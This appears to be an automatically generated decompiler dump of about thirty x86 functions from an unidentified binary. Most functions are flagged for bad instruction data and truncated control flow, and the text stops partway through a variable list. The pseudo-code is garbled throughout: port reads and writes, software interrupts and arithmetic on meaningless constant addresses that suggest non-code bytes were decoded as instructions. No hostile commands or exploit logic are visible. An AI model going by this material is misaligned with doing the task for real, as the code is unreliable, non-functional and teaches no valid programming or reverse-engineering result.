  uVar1 = in(param_2);
  *unaff_EDI = uVar1;
  if (unaff_EBP != -1 && SCARRY4(unaff_EBP,1) == unaff_EBP + 1 < 0) {
    *(BADSPACEBASE **)(param_1 + 1) = register0x00000010;
                    // WARNING: Bad instruction - Truncating control flow here
    halt_baddata();
  }
  return CONCAT44(0xcd306f03,unaff_EDI + 0x3730a87c);
}



void __break(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// WARNING: Control flow encountered bad instruction data

void __fastcall FUN_0041c12a(undefined4 param_1,undefined2 param_2)

{
  char cVar1;
  code *pcVar2;
  char in_AL;
  int unaff_EBX;
  undefined4 *puVar3;
  undefined **ppuVar5;
  undefined4 *unaff_EBP;
  undefined *unaff_ESI;
  bool bVar6;
  undefined *apuStack37283 [9300];
  undefined *puStack80;
  undefined4 uStack8;
  undefined4 *puVar4;
  
  bVar6 = (char)(in_AL + 'n') < '\0';
  puStack80 = &stack0xfffffffc;
  puVar3 = (undefined4 *)&stack0xfffffffc;
  apuStack37283[1] = &stack0xfffffffc;
  puVar4 = (undefined4 *)&stack0xfffffffc;
  cVar1 = '\x12';
  do {
    unaff_EBP = unaff_EBP + -1;
    puVar3 = puVar3 + -1;
    *puVar3 = *unaff_EBP;
    cVar1 = cVar1 + -1;
  } while ('\0' < cVar1);
  do {
    if (in_AL == -0x6e || SCARRY1(in_AL,'n') != bVar6) {
      ppuVar5 = apuStack37283 + 1;
      cVar1 = '\x1b';
      do {
        puVar4 = puVar4 + -1;
        ppuVar5 = ppuVar5 + -1;
        *ppuVar5 = (undefined *)*puVar4;
        cVar1 = cVar1 + -1;
      } while ('\0' < cVar1);
      pcVar2 = (code *)swi(3);
      (*pcVar2)();
      return;
    }
  } while (bVar6);
  out(*unaff_ESI,param_2);
  *(byte *)(unaff_EBX + -0x35) = *(byte *)(unaff_EBX + -0x35) ^ (byte)unaff_EBX;
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data

void FUN_0041c143(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)swi(0xc5);
  (*pcVar1)();
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data

void FUN_0041c1af(void)

{
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0041c26d(void)

{
  code *pcVar1;
  undefined uVar2;
  int in_EAX;
  undefined4 uVar3;
  undefined2 extraout_DX;
  int unaff_ESI;
  undefined2 in_CS;
  
  *(undefined *)
   (in_EAX + -0x63436f31 + (CONCAT31((int3)(in_EAX >> 0x27),(char)(in_EAX >> 0x1f)) | 5) * 4) = 0x6e
  ;
  pcVar1 = (code *)swi(0x11);
  uVar2 = (*pcVar1)();
  out(extraout_DX,uVar2);
  uVar3 = in(0x56);
  *(undefined *)(unaff_ESI + -0x6a248fd9) = 0xc;
  out(extraout_DX,uVar3);
  _DAT_aa423759 = in_CS;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint __fastcall
FUN_0041c453(undefined4 param_1,byte param_2,undefined4 param_3,int param_4,undefined4 param_5,
            undefined4 param_6,undefined2 param_7,byte param_8,uint param_9)

{
  int *piVar1;
  byte bVar2;
  uint uVar3;
  ulonglong uVar4;
  uint5 uVar5;
  byte bVar6;
  byte *unaff_EDI;
  byte in_CF;
  
  bVar6 = *unaff_EDI;
  bVar2 = *unaff_EDI;
  *unaff_EDI = bVar2 + param_2 + in_CF;
  uVar5 = CONCAT14(CARRY1(bVar6,param_2) || CARRY1(bVar2 + param_2,in_CF),param_3);
  uVar4 = (ulonglong)uVar5 << 0x1a;
  uVar3 = *(uint *)(param_9 + 0x2cda4bc);
  *(uint *)(param_9 + 0x2cda4bc) =
       (uint)(CONCAT14((uVar4 & 0x100000000) != 0,uVar3) >> (param_8 & 0x1f)) |
       uVar3 << 0x21 - (param_8 & 0x1f);
  bVar6 = (byte)param_9;
  out(param_7,bVar6);
  _DAT_d4e43d99 = param_9;
  piVar1 = (int *)((((uint)(uVar5 >> 7) | (uint)uVar4) - 1) + param_4 * 2);
  *piVar1 = *piVar1 + -0x45;
  out(param_7,param_9);
  return param_9 & 0xffff0000 | CONCAT11(bVar6 / 0x53,bVar6) & 0xffffff00 | (uint)(bVar6 % 0x53);
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Unable to track spacebase fully for stack

uint __fastcall FUN_0041c7a6(int param_1,uint *param_2)

{
  int *piVar1;
  undefined uVar2;
  char cVar3;
  code *pcVar4;
  undefined in_AL;
  short sVar5;
  undefined4 *puVar6;
  uint uVar7;
  uint unaff_EBX;
  uint uVar8;
  int iVar9;
  undefined4 *puVar10;
  uint uVar11;
  undefined4 *puVar12;
  int unaff_EBP;
  int iVar13;
  uint unaff_ESI;
  uint *puVar14;
  undefined *puVar15;
  uint *unaff_EDI;
  ushort in_ES;
  bool bVar16;
  uint unaff_retaddr;
  int iStack36;
  int iStack24;
  
  *(int *)((int)unaff_EDI + -0x70561772) = *(int *)((int)unaff_EDI + -0x70561772) + 1;
  uVar8 = unaff_EBX & 0xffff0000 | (uint)CONCAT11(in_AL,(char)unaff_EBX);
  bVar16 = (unaff_retaddr & 0x400) != 0;
  *(char *)param_2 = *(char *)param_2 + (char)param_1;
  iVar9 = iRame0443588;
  iStack24 = unaff_EBP + -1;
  puVar6 = (undefined4 *)(param_1 + -1);
  if (puVar6 == (undefined4 *)0x0 || iStack24 != 0) {
    bVar16 = ((uint)unaff_EDI & 1) != 0;
    sVar5 = CONCAT11((((uint)unaff_EDI & 0x80) != 0) << 7 | (((uint)unaff_EDI & 0x40) != 0) << 6 |
                     (((uint)unaff_EDI & 0x10) != 0) << 4 | (((uint)unaff_EDI & 4) != 0) << 2 | 2U |
                     bVar16,(char)unaff_ESI);
    uVar8 = uVar8 - 1;
    uVar11 = unaff_ESI & 0xffff0000 | (uint)in_ES;
    iVar9 = (uVar8 & 0xffff0000 |
            (uint)CONCAT11((char)(uVar8 >> 8) + *(char *)(unaff_ESI - 0x38) + bVar16,(char)uVar8)) +
            1;
    uVar8 = unaff_ESI & 0xffff0000 |
            (uint)(ushort)(sVar5 / (short)*(char *)(unaff_EDI + -10) & 0xffU |
                          sVar5 % (short)*(char *)(unaff_EDI + -10) << 8);
    puVar14 = unaff_EDI + 1;
    iVar13 = unaff_ESI + 4;
    unaff_EDI = param_2;
  }
  else {
    *unaff_EDI = uVar8;
    uVar11 = iStack24 << ((byte)puVar6 & 0x1f);
    puVar14 = (uint *)((int)unaff_EDI + (uint)bVar16 * -2 + (uint)bVar16 * -8 + 5);
    iVar13 = unaff_ESI + 1 + (uint)bVar16 * -2;
  }
  uVar8 = uVar8 | 0xaf14bc3;
  puVar12 = (undefined4 *)(uVar11 + (int)puVar14);
  bVar16 = puVar12 != (undefined4 *)0x0;
  uVar7 = (uint)unaff_EDI & 0xffffff00 | (uint)*(byte *)(iVar13 + 100);
  puVar10 = (undefined4 *)&stack0xffffffe0;
  cVar3 = '\a';
  do {
    puVar12 = puVar12 + -1;
    puVar10 = puVar10 + -1;
    *puVar10 = *puVar12;
    cVar3 = cVar3 + -1;
  } while ('\0' < cVar3);
  if (bVar16) {
    uVar8 = uVar8 & 0xffffff00 | (uint)(byte)(((char)uVar8 + '\\') - CARRY4(uVar11,(uint)puVar14));
    puVar15 = (undefined *)*puVar6;
    *(int *)iVar9 = iVar9;
    if (-1 < (int)(*(uint *)(iVar9 + -0x7f) - uVar8)) {
      *(int *)(puVar15 + 0x39ec958e) = *(int *)(puVar15 + 0x39ec958e) + 1;
      uVar2 = in((short)uVar7);
      *puVar15 = uVar2;
      *(undefined *)(iVar9 + uVar7 * 2) = 0x48;
      pcVar4 = (code *)swi(0x8e);
      uVar8 = (*pcVar4)();
      return uVar8;
    }
    piVar1 = (int *)(iVar13 * 9 + -0x11ae2496);
    *piVar1 = (int)(puVar15 + (uint)(uVar8 <= *(uint *)(iVar9 + -0x7f)) + *piVar1);
                    // WARNING: Bad instruction - Truncating control flow here
    halt_baddata();
  }
  return uVar8 & 0xffffff00 | (uint)(byte)((char)((uint)iVar9 >> 8) - 0x22);
}



// WARNING: Control flow encountered bad instruction data

void FUN_0041c7e6(void)

{
  int *piVar1;
  char in_AL;
  int unaff_EBP;
  int unaff_ESI;
  int unaff_EDI;
  
  *(char *)(unaff_EBP + 0x7949d9ec) = in_AL + -0x77;
  piVar1 = (int *)(unaff_ESI * 9 + -0x11ae2496);
  *piVar1 = *piVar1 + unaff_EDI;
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Instruction at (ram,0x0041c823) overlaps instruction at (ram,0x0041c822)
// 
// WARNING: Unable to track spacebase fully for stack

uint __fastcall FUN_0041c80a(int param_1,uint param_2)

{
  uint *puVar1;
  undefined uVar2;
  int **ppiVar3;
  char cVar4;
  code *pcVar5;
  byte bVar6;
  short sVar7;
  uint uVar8;
  int **in_EAX;
  undefined4 *puVar9;
  uint uVar10;
  int **ppiVar11;
  int **unaff_EBX;
  int *piVar12;
  int **unaff_EBP;
  int iVar13;
  uint unaff_ESI;
  undefined4 *puVar14;
  undefined *puVar15;
  undefined4 *unaff_EDI;
  ushort in_ES;
  byte in_CF;
  bool bVar16;
  bool bVar17;
  byte in_AF;
  bool bVar18;
  bool bVar19;
  byte in_TF;
  byte in_IF;
  bool bVar20;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  uint uVar21;
  int *piStack8;
  undefined *puStack4;
  
  puVar1 = (uint *)((int)unaff_EDI + 0x4e + (int)in_EAX);
  uVar8 = (uint)in_CF;
  uVar21 = *puVar1 + 0x324875fc;
  bVar16 = *puVar1 < 0xcdb78a04 || uVar21 < uVar8;
  bVar20 = SBORROW4(*puVar1,-0x324875fc) != SBORROW4(uVar21,uVar8);
  *puVar1 = uVar21 - uVar8;
  bVar19 = (int)*puVar1 < 0;
  bVar18 = *puVar1 == 0;
  bVar17 = (POPCOUNT(*puVar1 & 0xff) & 1U) == 0;
  while( true ) {
    while( true ) {
      puStack4 = (undefined *)((uint)puStack4 & 0xffff0000 | (uint)in_ES);
      ppiVar11 = &piStack8;
      piStack8 = (int *)((uint)(in_NT & 1) * 0x4000 | (uint)bVar20 * 0x800 |
                         (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | (uint)bVar19 * 0x80
                         | (uint)bVar18 * 0x40 | (uint)(in_AF & 1) * 0x10 | (uint)bVar17 * 4 |
                         (uint)bVar16 | (uint)(in_ID & 1) * 0x200000 | (uint)(in_VIP & 1) * 0x100000
                         | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000);
      out(4,(char)in_EAX);
      piVar12 = (int *)((int)unaff_EDI + 0x4e);
      iVar13 = *piVar12;
      *piVar12 = *piVar12 >> 0x13;
      bVar16 = (iVar13 >> 0x12 & 1U) != 0;
      bVar18 = *piVar12 == 0;
      if (-1 < *piVar12) break;
      if (param_1 + -1 == 0 || bVar18) {
        puVar9 = (undefined4 *)(param_1 + -2);
        if (puVar9 != (undefined4 *)0x0 && bVar18) {
          *unaff_EDI = unaff_EBX;
          param_2 = (uint)*in_EAX;
          uVar8 = (int)unaff_EBP << ((byte)puVar9 & 0x1f);
          puVar14 = (undefined4 *)((int)unaff_EDI + 5);
          iVar13 = unaff_ESI + 1;
        }
        else {
          uVar21 = (uint)*in_EAX;
          bVar16 = (uVar21 & 1) != 0;
          uVar8 = (uint)in_EAX[1];
          sVar7 = CONCAT11(((uVar21 & 0x80) != 0) << 7 | ((uVar21 & 0x40) != 0) << 6 |
                           ((uVar21 & 0x10) != 0) << 4 | ((uVar21 & 4) != 0) << 2 | 2U | bVar16,
                           (char)uVar8);
          uVar21 = (int)unaff_EBX - 1;
          *(ushort *)(in_EAX + 1) = in_ES;
          ppiVar11 = (int **)((uVar21 & 0xffff0000 |
                              (uint)CONCAT11((char)(uVar21 >> 8) + *(char *)(unaff_ESI - 0x38) +
                                             bVar16,(char)uVar21)) + 1);
          unaff_EBX = (int **)(uVar8 & 0xffff0000 |
                              (uint)(ushort)(sVar7 / (short)*(char *)(unaff_EDI + -10) & 0xffU |
                                            sVar7 % (short)*(char *)(unaff_EDI + -10) << 8));
          uVar8 = (uint)in_EAX[1];
          in_EAX[1] = (int *)unaff_ESI;
          puVar14 = unaff_EDI + 1;
          iVar13 = unaff_ESI + 4;
        }
        uVar21 = (uint)unaff_EBX | 0xaf14bc3;
        piVar12 = (int *)(uVar8 + (int)puVar14);
        bVar16 = piVar12 != (int *)0x0;
        uVar10 = param_2 & 0xffffff00 | (uint)*(byte *)(iVar13 + 100);
        *in_EAX = piVar12;
        cVar4 = '\a';
        ppiVar3 = in_EAX;
        do {
          piVar12 = piVar12 + -1;
          ppiVar3 = (int **)((int *)ppiVar3 + -1);
          *ppiVar3 = (int *)*piVar12;
          cVar4 = cVar4 + -1;
        } while ('\0' < cVar4);
        in_EAX[-8] = (int *)in_EAX;
        if (bVar16) {
          bVar6 = ((char)uVar21 + '\\') - CARRY4(uVar8,(uint)puVar14);
          uVar8 = uVar21 & 0xffffff00 | (uint)bVar6;
          puVar15 = (undefined *)*puVar9;
          *ppiVar11 = (int *)ppiVar11;
          *(byte *)((int)in_EAX + -0x125af462) = bVar6;
          if (-1 < (int)(*(uint *)((int)ppiVar11 + -0x7f) - uVar8)) {
            *(int *)(puVar15 + 0x39ec958e) = *(int *)(puVar15 + 0x39ec958e) + 1;
            uVar2 = in((short)uVar10);
            *puVar15 = uVar2;
            *(undefined *)((int)ppiVar11 + uVar10 * 2) = 0x48;
            pcVar5 = (code *)swi(0x8e);
            uVar8 = (*pcVar5)();
            return uVar8;
          }
          piVar12 = (int *)(iVar13 * 9 + -0x11ae2496);
          *piVar12 = (int)(puVar15 + (uint)(uVar8 <= *(uint *)((int)ppiVar11 + -0x7f)) + *piVar12);
                    // WARNING: Bad instruction - Truncating control flow here
          halt_baddata();
        }
        return uVar21 & 0xffffff00 | (uint)(byte)((char)((uint)ppiVar11 >> 8) - 0x22);
      }
      bVar20 = SBORROW4(unaff_ESI,1);
      unaff_ESI = unaff_ESI - 1;
      bVar19 = (int)unaff_ESI < 0;
      bVar18 = unaff_ESI == 0;
      bVar17 = (POPCOUNT(unaff_ESI & 0xff) & 1U) == 0;
      in_EAX = unaff_EBX;
      param_1 = param_1 + -1;
      unaff_EBX = &piStack8;
    }
    if (bVar16 || bVar18) {
      ppiVar11 = in_EAX + -1;
      in_EAX[-1] = (int *)unaff_EBP;
      cVar4 = '\x10';
      do {
        unaff_EBP = unaff_EBP + -1;
        ppiVar11 = ppiVar11 + -1;
        *ppiVar11 = *unaff_EBP;
        cVar4 = cVar4 + -1;
      } while ('\0' < cVar4);
    }
    else {
      unaff_EBX = (int **)*in_EAX;
      param_2 = param_2 - 1;
      *in_EAX = (int *)param_1;
    }
    puStack4 = (undefined *)&piStack8;
    *(undefined *)(unaff_EDI + -0x1fdd4937) = 0xf8;
    if (-1 < (int)(int **)((int)unaff_EBX + -1)) break;
    puVar1 = (uint *)((int)unaff_EDI + (int)&stack0x00000046);
    uVar8 = (uint)bVar16;
    uVar21 = *puVar1 + 0x324875fc;
    bVar16 = *puVar1 < 0xcdb78a04 || uVar21 < uVar8;
    bVar20 = SBORROW4(*puVar1,-0x324875fc) != SBORROW4(uVar21,uVar8);
    *puVar1 = uVar21 - uVar8;
    bVar19 = (int)*puVar1 < 0;
    bVar18 = *puVar1 == 0;
    bVar17 = (POPCOUNT(*puVar1 & 0xff) & 1U) == 0;
    in_EAX = &piStack8;
    unaff_EBX = (int **)((int)unaff_EBX + -1);
    unaff_EBP = &piStack8;
  }
  puVar15 = (undefined *)(uint)(((int)&puStack4 >> 3 & 1U) != 0);
  if (&stack0x210286aa == puVar15 ||
      (SBORROW4((int)&piStack8,-0x210286b2) != SBORROW4((int)&stack0x210286aa,(int)puVar15)) !=
      (int)&stack0x210286aa - (int)puVar15 < 0) {
    in((short)param_2);
                    // WARNING: Bad instruction - Truncating control flow here
    halt_baddata();
  }
  *(uint *)(param_1 + -0x37) = unaff_ESI;
  do {
                    // WARNING: Do nothing block with infinite loop
  } while( true );
}



// WARNING: Control flow encountered bad instruction data

void FUN_0041c8a4(void)

{
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Unable to track spacebase fully for stack
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_0041cc70(uint param_1,int param_2)

{
  byte *pbVar1;
  uint uVar2;
  code *pcVar3;
  byte bVar4;
  uint in_EAX;
  undefined4 *puVar5;
  int unaff_EBX;
  int unaff_EBP;
  int unaff_ESI;
  byte bVar6;
  
  bVar6 = (byte)(param_1 >> 8) | *(byte *)(unaff_EBX + 0x72174399);
  puVar5 = (undefined4 *)(param_1 & 0xffff0000 | (uint)CONCAT11(bVar6,(char)param_1));
  if (bVar6 == 0) {
    pcVar3 = (code *)swi(3);
    (*pcVar3)();
    return;
  }
  if (_DAT_43c1f09c <= (int)puVar5) {
    return;
  }
  bVar4 = (byte)in_EAX + 0x96;
  _DAT_8b448b8c = in_EAX & 0xffffff00 | (uint)bVar4;
  pbVar1 = (byte *)(_DAT_8b448b90 + -0xb);
  _DAT_8b448b88 = 0xffffffd4;
  bVar6 = (char)param_1 + (char)*puVar5 + ((byte)in_EAX < 0x6a) & 0x1f;
  uVar2 = *(uint *)(param_2 + -0x37306b44);
  _DAT_8b448b90 = _DAT_8b448b8c;
  *(uint *)(param_2 + -0x37306b44) =
       uVar2 << bVar6 |
       (uint)(CONCAT14(&DAT_8b448b88 <
                       (undefined *)((unaff_EBP - (unaff_ESI + -1)) - (uint)(bVar4 < *pbVar1)),uVar2
                      ) >> 0x21 - bVar6);
  pcVar3 = (code *)swi(3);
  (*pcVar3)();
  return;
}



undefined __fastcall FUN_0041cc9c(byte param_1,int param_2)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  undefined in_AL;
  undefined uVar4;
  uint unaff_EBX;
  uint *puVar5;
  int unaff_ESI;
  byte in_CF;
  
  uVar1 = *(uint *)(unaff_ESI + -0x5135ac34);
  uVar3 = unaff_EBX + *(uint *)(unaff_ESI + -0x5135ac34);
  puVar5 = (uint *)(uVar3 + in_CF);
  *(undefined *)(param_2 + -10) = *(undefined *)(param_2 + -10);
  out(0x52,in_AL);
  uVar2 = *puVar5;
  *puVar5 = (uint)(CONCAT14(CARRY4(unaff_EBX,uVar1) || CARRY4(uVar3,(uint)in_CF),uVar2) >>
                  (param_1 & 0x1f)) | uVar2 << 0x21 - (param_1 & 0x1f);
  uVar4 = in((short)param_2);
  return uVar4;
}



// WARNING: Control flow encountered bad instruction data

void __fastcall FUN_0041d520(int param_1,int param_2)

{
  byte bVar1;
  int unaff_EBX;
  int unaff_EDI;
  
  bVar1 = *(byte *)(unaff_EBX + -0x24a9f2f0 + unaff_EDI * 4);
  *(byte *)(param_2 + -0x18f837f7) = *(byte *)(param_2 + -0x18f837f7) | (byte)param_1;
  *(byte *)(param_1 + 0x1b) = *(byte *)(param_1 + 0x1b) ^ ((byte)((uint)unaff_EBX >> 8) | bVar1);
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data

void __fastcall FUN_0041dc05(byte param_1)

{
  code *pcVar1;
  undefined uVar2;
  undefined2 extraout_DX;
  int unaff_EBP;
  uint *unaff_EDI;
  
  if (unaff_EBP + 1 < 0) {
    pcVar1 = (code *)swi(0x45);
    uVar2 = (*pcVar1)();
    out(extraout_DX,uVar2);
    return;
  }
  *unaff_EDI = *unaff_EDI << (param_1 & 0x1f) | *unaff_EDI >> 0x20 - (param_1 & 0x1f);
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data

void __fastcall FUN_00420a99(int param_1,undefined2 param_2)

{
  undefined uVar1;
  undefined4 in_EAX;
  undefined4 unaff_EBX;
  undefined4 *unaff_EDI;
  
  *unaff_EDI = in_EAX;
  uVar1 = in(param_2);
  *(undefined *)(unaff_EDI + 1) = uVar1;
  *(int *)((int)unaff_EDI + 5) =
       (int)(short)((ushort)in_EAX |
                   (ushort)*(undefined4 *)
                            (CONCAT31((int3)((uint)unaff_EBX >> 8),0x97) + param_1 * 2));
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



uint __fastcall FUN_00420d58(int param_1,uint param_2)

{
  undefined in_AL;
  undefined *unaff_EDI;
  
  for (; param_1 != 0; param_1 = param_1 + -1) {
    *unaff_EDI = in_AL;
    unaff_EDI = unaff_EDI + 1;
  }
  return (uint)(unaff_EDI +
               (uint)CARRY4(param_2,*(uint *)(param_2 + 0x58c9f45)) +
               *(int *)(unaff_EDI + 0x3b049745)) | 0x52;
}



void __fastcall FUN_004224d0(undefined4 param_1,uint param_2)

{
  code *pcVar1;
  char *pcVar2;
  int unaff_ESI;
  
  *(int *)(param_2 + 0x95774564) = *(int *)(param_2 + 0x95774564) + 0x33;
  pcVar2 = (char *)(param_2 & 0xffffff00 | (uint)(byte)((byte)param_2 + *(byte *)(unaff_ESI + 0x52))
                   );
  *pcVar2 = *pcVar2 + (char)((param_2 & 0xffffff00) >> 8) +
            CARRY1((byte)param_2,*(byte *)(unaff_ESI + 0x52));
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// WARNING: Control flow encountered bad instruction data

void __fastcall FUN_00422a3b(int param_1,undefined2 param_2)

{
  undefined in_AL;
  float10 in_ST0;
  
  *(double *)(param_1 + -0x61) = (double)in_ST0;
  out(param_2,in_AL);
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data

void FUN_00422a6c(void)

{
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data

void __fastcall FUN_00422b1a(byte param_1)

{
  char cVar1;
  byte *in_EAX;
  undefined4 *puVar2;
  undefined4 *unaff_EBP;
  undefined4 uStack8;
  
  *in_EAX = *in_EAX | param_1;
  puVar2 = (undefined4 *)&stack0xfffffffc;
  cVar1 = '\x05';
  do {
    unaff_EBP = unaff_EBP + -1;
    puVar2 = puVar2 + -1;
    *puVar2 = *unaff_EBP;
    cVar1 = cVar1 + -1;
  } while ('\0' < cVar1);
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



uint __fastcall FUN_00422daf(int param_1)

{
  uint *puVar1;
  byte bVar2;
  uint in_EAX;
  int unaff_EBP;
  bool bVar3;
  
  puVar1 = (uint *)(in_EAX + 0x4c605a3);
  bVar3 = (*puVar1 & 1) != 0;
  *puVar1 = *puVar1 >> 1;
  if (!bVar3 && *puVar1 != 0) {
    bVar2 = (char)in_EAX - (char)(in_EAX >> 8);
    *(char *)(param_1 + -0x7821fb1b) = *(char *)(param_1 + -0x7821fb1b) + (char)param_1 + bVar3;
    return in_EAX & 0xffff0000 | CONCAT11(bVar2 / 0x76,bVar2) & 0xffffff00 |
           (uint)(byte)(bVar2 % 0x76 + 0x33);
  }
  *(int *)(unaff_EBP + 0x39294d0f) = *(int *)(unaff_EBP + 0x39294d0f) - unaff_EBP;
  return in_EAX & 0xffffff00;
}



int __fastcall FUN_00422dd9(uint *param_1,int param_2)

{
  uint *puVar1;
  byte bVar2;
  ushort in_AX;
  int unaff_EBX;
  uint unaff_EBP;
  uint uVar3;
  byte *unaff_EDI;
  char in_CF;
  float10 in_ST0;
  
  bVar2 = -in_CF;
  *(uint *)(unaff_EBP + 0xdc6a5253) = *(uint *)(unaff_EBP + 0xdc6a5253) & unaff_EBX - 1U;
  *param_1 = *param_1 & unaff_EBP;
  uVar3 = unaff_EBP + *(int *)(param_2 + 0xc94c358) + (uint)((in_AX & 0x100) != 0);
  puVar1 = (uint *)(uVar3 + 0x4c3d874d);
  *puVar1 = *puVar1 | uVar3;
  *(int *)((int)param_1 + 0x26dfa85) = (int)in_ST0;
  for (; param_1 != (uint *)0x0; param_1 = (uint *)((int)param_1 + -1)) {
    *unaff_EDI = bVar2;
    unaff_EDI = unaff_EDI + 1;
  }
  *unaff_EDI = bVar2;
  return (int)(short)(in_AX & 0xff00 | (ushort)bVar2);
}



// WARNING: Control flow encountered bad instruction data

undefined8 __fastcall FUN_00422e78(undefined4 param_1,undefined4 param_2)

{
  int in_EAX;
  bool in_ZF;
  
  if (in_ZF) {
                    // WARNING: Bad instruction - Truncating control flow here
    halt_baddata();
  }
  return CONCAT44(in_EAX + -0x3337822,param_2);
}



// WARNING: Control flow encountered bad instruction data

void __fastcall FUN_00422ea9(undefined4 param_1,undefined2 param_2)

{
  char cVar1;
  uint in_EAX;
  undefined *puVar2;
  char *unaff_EBP;
  undefined unaff_DI;
  
  out(param_2,(char)in_EAX);
  puVar2 = (undefined *)(in_EAX & 0xffff0000 | (uint)CONCAT11(200,(char)in_EAX));
  *puVar2 = unaff_DI;
  cVar1 = in(param_2);
  *unaff_EBP = cVar1 + -0x22;
  *(undefined4 *)(puVar2 + -0x55ecae38) = 0x3f0dec8c;
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Instruction at (ram,0x00422f09) overlaps instruction at (ram,0x00422f08)
// 
// WARNING: Unable to track spacebase fully for stack

void FUN_00422ed7(undefined4 *param_1,char *param_2)

{
  byte *pbVar1;
  byte bVar2;
  code *pcVar3;
  char cVar4;
  undefined in_AL;
  uint extraout_ECX;
  uint uVar5;
  undefined2 uVar6;
  char **ppcVar7;
  char **ppcVar8;
  undefined uVar9;
  undefined8 uVar10;
  undefined unaff_retaddr;
  uint in_stack_0000001c;
  int in_stack_00000020;
  uint in_stack_00000024;
  
  uVar9 = 0xaf90576e < in_stack_0000001c;
  pcVar3 = (code *)swi(0x88);
  DAT_9c85e363 = in_AL;
  uVar10 = (*pcVar3)();
  ppcVar7 = (char **)&DAT_a6123590;
  uVar6 = (undefined2)((ulonglong)uVar10 >> 0x20);
  out(*param_1,uVar6);
  pbVar1 = (byte *)((int)((ulonglong)uVar10 >> 0x20) + -0x21);
  bVar2 = *pbVar1;
  *pbVar1 = (byte)extraout_ECX;
  uVar5 = extraout_ECX & 0xffffff00 | (uint)bVar2;
  while( true ) {
    if (!(bool)uVar9) {
      *(undefined *)uVar10 = unaff_retaddr;
      cVar4 = in(uVar6);
      ppcVar7[-1] = (char *)0x51c787e7;
      ppcVar7[-2] = (char *)CONCAT31((int3)((uint)(in_stack_00000020 + -1) >> 8),9);
      *param_2 = cVar4 + -0x22;
      *(undefined4 *)
       ((undefined *)uVar10 + (uint)((in_stack_00000024 & 0x400) != 0) * -2 + -0x55ecae38) =
           0x3f0dec8c;
                    // WARNING: Bad instruction - Truncating control flow here
      halt_baddata();
    }
    in_stack_00000024 = (uint)*ppcVar7;
    uVar9 = (in_stack_00000024 & 1) != 0;
    *ppcVar7 = param_2;
    if (uVar5 == 1 || (in_stack_00000024 & 0x40) != 0) {
      uVar9 = !(bool)uVar9;
    }
    else {
      ppcVar8 = ppcVar7 + -1;
      ppcVar7 = ppcVar7 + -1;
      *ppcVar8 = param_2;
    }
    if ((in_stack_00000024 & 0x800) == 0) break;
    uVar5 = uVar5 - 2;
    if (uVar5 == 0) {
                    // WARNING: Bad instruction - Truncating control flow here
      halt_baddata();
    }
  }
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Instruction at (ram,0x00422f09) overlaps instruction at (ram,0x00422f08)
// 

void __fastcall FUN_00422f06(int param_1,undefined2 param_2)

{
  uint uVar1;
  char cVar2;
  undefined in_AL;
  char *unaff_EBP;
  undefined *unaff_EDI;
  bool bVar3;
  char *unaff_retaddr;
  
  do {
    uVar1 = (uint)unaff_retaddr & 0x400;
    bVar3 = ((uint)unaff_retaddr & 1) != 0;
    if (param_1 == 1 || ((uint)unaff_retaddr & 0x40) != 0) {
      bVar3 = !bVar3;
    }
    if (((uint)unaff_retaddr & 0x800) == 0) {
                    // WARNING: Bad instruction - Truncating control flow here
      halt_baddata();
    }
    param_1 = param_1 + -2;
    if (param_1 == 0) {
                    // WARNING: Bad instruction - Truncating control flow here
      halt_baddata();
    }
    unaff_retaddr = unaff_EBP;
  } while (bVar3);
  *unaff_EDI = in_AL;
  cVar2 = in(param_2);
  *unaff_EBP = cVar2 + -0x22;
  *(undefined4 *)(unaff_EDI + (uint)(uVar1 != 0) * -2 + -0x55ecae38) = 0x3f0dec8c;
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Control flow encountered bad instruction data

void __fastcall FUN_00423348(int param_1)

{
  int unaff_EBX;
  bool in_SF;
  
  if (in_SF) {
    return;
  }
  *(undefined4 *)(unaff_EBX + param_1 * 2) = 0xbb58cedd;
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Instruction at (ram,0x004233cc) overlaps instruction at (ram,0x004233c9)
// 
// WARNING: Unable to track spacebase fully for stack
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_004233c7(uint param_1)

{
  int iVar1;
  uint uVar2;
  undefined *puVar3;
  char cVar4;
  int iVar5;
  code *pcVar6;
  byte *pbVar7;
  undefined uVar8;
  char cVar9;
  byte bVar10;
  undefined **in_EAX;
  uint uVar11;
  undefined2 uVar12;
  int unaff_EBX;
  uint uVar13;
  uint uVar14;
  undefined4 *puVar15;
  undefined4 *puVar16;
  undefined4 *unaff_EBP;
  uint unaff_ESI;
